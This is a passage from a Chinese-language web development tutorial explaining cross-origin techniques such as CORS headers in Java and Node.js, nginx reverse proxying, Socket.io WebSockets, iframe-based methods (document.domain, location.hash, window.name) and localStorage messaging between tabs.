&#125;,</span><br><span class="line">   crossDomain: <span class="literal">true</span>,   <span class="comment">// 会让请求头中包含跨域的额外信息，但不会含cookie</span></span><br><span class="line">    ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>3.）Vue ajax</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// axios</span></span><br><span class="line">axios.defaults.withCredentials = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// vue-resource</span></span><br><span class="line">Vue.http.options.credentials = <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>服务端设置<br>若后端设置成功，前端浏览器控制台则不会出现跨域报错信息，反之，说明没设成功。<br>1.）Java后台</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 导入包：import javax.servlet.http.HttpServletResponse;</span></span><br><span class="line"><span class="comment"> * 接口参数中定义：HttpServletResponse response</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 允许跨域访问的域名：若有端口需写全（协议+域名+端口），若没有端口末尾不用加'/'</span></span><br><span class="line">response.setHeader(<span class="string">"Access-Control-Allow-Origin"</span>, <span class="string">"http://www.domain1.com"</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 允许前端带认证cookie：启用此项后，上面的域名不能为'*'，必须指定具体的域名，否则浏览器会提示</span></span><br><span class="line">response.setHeader(<span class="string">"Access-Control-Allow-Credentials"</span>, <span class="string">"true"</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 提示OPTIONS预检时，后端需要设置的两个常用自定义头</span></span><br><span class="line">response.setHeader(<span class="string">"Access-Control-Allow-Headers"</span>, <span class="string">"Content-Type,X-Requested-With"</span>);</span><br></pre></td></tr></table></figure><p>2.） Node.js</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> server = http.createServer();</span><br><span class="line"><span class="keyword">var</span> qs = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line"></span><br><span class="line">server.on(<span class="string">'request'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> postData = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据块接收中</span></span><br><span class="line">    req.addListener(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">        postData += chunk;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据接收完毕</span></span><br><span class="line">    req.addListener(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        postData = qs.parse(postData);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 跨域后台设置</span></span><br><span class="line">        res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">            <span class="string">'Access-Control-Allow-Credentials'</span>: <span class="string">'true'</span>,     <span class="comment">// 后端允许发送Cookie</span></span><br><span class="line">            <span class="string">'Access-Control-Allow-Origin'</span>: <span class="string">'http://www.domain1.com'</span>,    <span class="comment">// 允许访问的域（协议+域名+端口）</span></span><br><span class="line">            <span class="comment">/* </span></span><br><span class="line"><span class="comment">             * 此处设置的cookie还是domain2的而非domain1，因为后端也不能跨域写cookie(nginx反向代理可以实现)，</span></span><br><span class="line"><span class="comment">             * 但只要domain2中写入一次cookie认证，后面的跨域接口都能从domain2中获取cookie，从而实现所有的接口都能跨域访问</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="string">'Set-Cookie'</span>: <span class="string">'l=a123456;Path=/;Domain=www.domain2.com;HttpOnly'</span>  <span class="comment">// HttpOnly的作用是让js无法读取cookie</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        res.write(<span class="built_in">JSON</span>.stringify(postData));</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="string">'8080'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server is running at port 8080...'</span>);</span><br></pre></td></tr></table></figure></li></ol><h4 id="nginx代理跨域"><a href="#nginx代理跨域" class="headerlink" title="nginx代理跨域"></a>nginx代理跨域</h4><ol><li><p>nginx配置解决iconfont跨域<br>浏览器跨域访问js、css、img等常规静态资源被同源策略许可，但iconfont字体文件(eot|otf|ttf|woff|svg)例外，此时可在nginx的静态资源服务器中加入以下配置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">  add_header Access-Control-Allow-Origin *;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>nginx反向代理接口跨域<br>跨域原理： 同源策略是浏览器的安全策略，不是HTTP协议的一部分。服务器端调用HTTP接口只是使用HTTP协议，不会执行JS脚本，不需要同源策略，也就不存在跨越问题。<br>实现思路：通过nginx配置一个代理服务器（域名与domain1相同，端口不同）做跳板机，反向代理访问domain2接口，并且可以顺便修改cookie中domain信息，方便当前域cookie写入，实现跨域登录。</p><p>1.) nginx具体配置：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#proxy服务器</span></span><br><span class="line">server &#123;</span><br><span class="line">    listen       81;</span><br><span class="line">    server_name  www.domain1.com;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass   http://www.domain2.com:8080;  <span class="comment">#反向代理</span></span><br><span class="line">        proxy_cookie_domain www.domain2.com www.domain1.com; <span class="comment">#修改cookie里域名</span></span><br><span class="line">        index  index.html index.htm;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 当用webpack-dev-server等中间件代理接口访问nignx时，此时无浏览器参与，故没有同源限制，下面的跨域配置可不启用</span></span><br><span class="line">        add_header Access-Control-Allow-Origin http://www.domain1.com;  <span class="comment">#当前端只跨域不带cookie时，可为*</span></span><br><span class="line">        add_header Access-Control-Allow-Credentials <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.) 前端代码示例：</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前端开关：浏览器是否读写cookie</span></span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问nginx中的代理服务器</span></span><br><span class="line">xhr.open(<span class="string">'get'</span>, <span class="string">'http://www.domain1.com:81/?user=admin'</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure><p>3.) Nodejs后台示例：</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> server = http.createServer();</span><br><span class="line"><span class="keyword">var</span> qs = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line"></span><br><span class="line">server.on(<span class="string">'request'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> params = qs.parse(req.url.substring(<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向前台写cookie</span></span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">'Set-Cookie'</span>: <span class="string">'l=a123456;Path=/;Domain=www.domain2.com;HttpOnly'</span>   <span class="comment">// HttpOnly:脚本无法读取</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    res.write(<span class="built_in">JSON</span>.stringify(params));</span><br><span class="line">    res.end();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="string">'8080'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server is running at port 8080...'</span>);</span><br></pre></td></tr></table></figure></li></ol><h4 id="nodejs中间件代理跨域"><a href="#nodejs中间件代理跨域" class="headerlink" title="nodejs中间件代理跨域"></a>nodejs中间件代理跨域</h4><p>node中间件实现跨域代理，原理大致与nginx相同，都是通过启一个代理服务器，实现数据的转发，也可以通过设置cookieDomainRewrite参数修改响应头中cookie中域名，实现当前域的cookie写入，方便接口登录认证。</p><h4 id="WebSocket协议跨域"><a href="#WebSocket协议跨域" class="headerlink" title="WebSocket协议跨域"></a>WebSocket协议跨域</h4><p><code>WebSocket protocol</code> 是HTML5一种新的协议。它实现了浏览器与服务器全双工通信，同时允许跨域通讯，是server push技术的一种很好的实现。<br>原生 <code>WebSocket API</code> 使用起来不太方便，我们使用Socket.io，它很好地封装了webSocket接口，提供了更简单、灵活的接口，也对不支持webSocket的浏览器提供了向下兼容。</p><ol><li><p>前端设置：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>user input：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./socket.io.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> socket = io(<span class="string">'http://www.domain2.com:8080'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// 连接成功处理</span></span></span><br><span class="line"><span class="javascript">socket.on(<span class="string">'connect'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 监听服务端消息</span></span></span><br><span class="line"><span class="javascript">    socket.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'data from server: ---&gt; '</span> + msg); </span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 监听服务端关闭</span></span></span><br><span class="line"><span class="javascript">    socket.on(<span class="string">'disconnect'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'Server socket has closed.'</span>); </span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'input'</span>)[<span class="number">0</span>].onblur = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    socket.send(<span class="keyword">this</span>.value);</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Nodejs socket后台：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> socket = <span class="built_in">require</span>(<span class="string">'socket.io'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启http服务</span></span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">'Content-type'</span>: <span class="string">'text/html'</span></span><br><span class="line">    &#125;);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="string">'8080'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server is running at port 8080...'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听socket连接</span></span><br><span class="line">socket.listen(server).on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">client</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 接收信息</span></span><br><span class="line">    client.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">        client.send(<span class="string">'hello：'</span> + msg);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'data from client: ---&gt; '</span> + msg);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 断开处理</span></span><br><span class="line">    client.on(<span class="string">'disconnect'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Client socket has closed.'</span>); </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol><h4 id="document-domain-iframe跨域"><a href="#document-domain-iframe跨域" class="headerlink" title="document.domain + iframe跨域"></a>document.domain + iframe跨域</h4><p>此方案仅限主域相同，子域不同的跨域应用场景。</p><p>实现原理：两个页面都通过js强制设置 <code>document.domain</code> 为基础主域，就实现了同域。</p><ol><li><p>父窗口：(<a href="http://www.domain.com/a.html" target="_blank" rel="noopener">http://www.domain.com/a.html</a>)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://child.domain.com/b.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">'domain.com'</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> user = <span class="string">'admin'</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>子窗口：(<a href="http://child.domain.com/b.html" target="_blank" rel="noopener">http://child.domain.com/b.html</a>)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">'domain.com'</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 获取父窗口中变量</span></span></span><br><span class="line"><span class="javascript">    alert(<span class="string">'get js data from parent ---&gt; '</span> + <span class="built_in">window</span>.parent.user);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="location-hash-iframe"><a href="#location-hash-iframe" class="headerlink" title="location.hash + iframe"></a>location.hash + iframe</h4><p>实现原理： a欲与b跨域相互通信，通过中间页c来实现。<br>三个页面，不同域之间利用iframe的location.hash传值，相同域之间直接js访问来通信。</p><p>具体实现：A域：a.html -&gt; B域：b.html -&gt; A域：c.html，a与b不同域只能通过hash值单向通信，b与c也不同域也只能单向通信，但c与a同域，所以c可通过parent.parent访问a页面所有对象。</p><ol><li><p>a.html：(<a href="http://www.domain1.com/a.html" target="_blank" rel="noopener">http://www.domain1.com/a.html</a>)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://www.domain2.com/b.html"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 向b.html传hash值</span></span></span><br><span class="line"><span class="javascript">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        iframe.src = iframe.src + <span class="string">'#user=admin'</span>;</span></span><br><span class="line"><span class="undefined">    &#125;, 1000);</span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript">    <span class="comment">// 开放给同域c.html的回调方法</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">onCallback</span>(<span class="params">res</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">'data from c.html ---&gt; '</span> + res);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>b.html：(<a href="http://www.domain2.com/b.html" target="_blank" rel="noopener">http://www.domain2.com/b.html</a>)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://www.domain1.com/c.html"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 监听a.html传来的hash值，再传给c.html</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onhashchange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">        iframe.src = iframe.src + location.hash;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>c.html：(<a href="http://www.domain1.com/c.html" target="_blank" rel="noopener">http://www.domain1.com/c.html</a>)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 监听b.html传来的hash值</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onhashchange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 再通过操作同域a.html的js回调，将结果传回</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.parent.parent.onCallback(<span class="string">'hello: '</span> + location.hash.replace(<span class="string">'#user='</span>, <span class="string">''</span>));</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="window-name-iframe跨域"><a href="#window-name-iframe跨域" class="headerlink" title="window.name + iframe跨域"></a>window.name + iframe跨域</h4><p><code>window.name</code> 属性的独特之处：name值在不同的页面（甚至不同域名）加载后依旧存在，并且可以支持非常长的 name 值（2MB）。</p><ol><li><p>a.html：(<a href="http://www.domain1.com/a.html" target="_blank" rel="noopener">http://www.domain1.com/a.html</a>)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> proxy = <span class="function"><span class="keyword">function</span>(<span class="params">url, callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> state = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载跨域页面</span></span><br><span class="line">    iframe.src = url;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// onload事件会触发2次，第1次加载跨域页，并留存数据于window.name</span></span><br><span class="line">    iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (state === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 第1次onload(跨域页)成功后，切换到同域代理页面</span></span><br><span class="line">            iframe.contentWindow.location = <span class="string">'http://www.domain1.com/proxy.html'</span>;</span><br><span class="line">            state = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> (state === <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="comment">// 第2次onload(同域proxy页)成功后，读取同域window.name中数据</span></span><br><span class="line">            callback(iframe.contentWindow.name);</span><br><span class="line">            destoryFrame();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问）</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">destoryFrame</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        iframe.contentWindow.document.write(<span class="string">''</span>);</span><br><span class="line">        iframe.contentWindow.close();</span><br><span class="line">        <span class="built_in">document</span>.body.removeChild(iframe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求跨域b页面数据</span></span><br><span class="line">proxy(<span class="string">'http://www.domain2.com/b.html'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    alert(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>proxy.html：(<a href="http://www.domain1.com/proxy...." target="_blank" rel="noopener">http://www.domain1.com/proxy....</a>)</p><p>中间代理页，与a.html同域，内容为空即可。</p></li><li><p>b.html：(<a href="http://www.domain2.com/b.html" target="_blank" rel="noopener">http://www.domain2.com/b.html</a>)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.name = <span class="string">'This is domain2 data!'</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="同源下不同标签的页面如何进行通信"><a href="#同源下不同标签的页面如何进行通信" class="headerlink" title="同源下不同标签的页面如何进行通信"></a>同源下不同标签的页面如何进行通信</h2><h3 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h3><ol><li><code>localstorage</code> 是浏览器多个标签共用的存储空间，所以可以用来实现多标签之间的通信(ps：<code>session</code> 是会话级的存储空间，每个标签页都是单独的）。</li><li><code>onstorage</code> 以及 <code>storage</code> 事件，针对都是非当前页面对 <code>localStorage</code> 进行修改时才会触发，当前页面修改 <code>localStorage</code> 不会触发监听函数。然后就是在对原有的数据的值进行修改时才会触发，比如原本已经有一个key为a 值为b的 <code>localStorage</code>，你再执行：<code>localStorage.setItem(&#39;a&#39;, &#39;b&#39;)</code>代码，同样是不会触发监听函数的。</li><li>要访问一个localStorage对象，页面必须来自同一个域名（子域名无效），使用同一种协议，在同一个端口上。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onstorage = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(e)&#125;</span><br><span class="line"><span class="comment">// 或者这样</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'storage'</span>, (e) =&gt; <span class="built_in">console</span>.log(e))</span><br></pre></td></tr></table></figure></li></ol><h3 id="websocket"><a href="#websocket" class="headerlink" 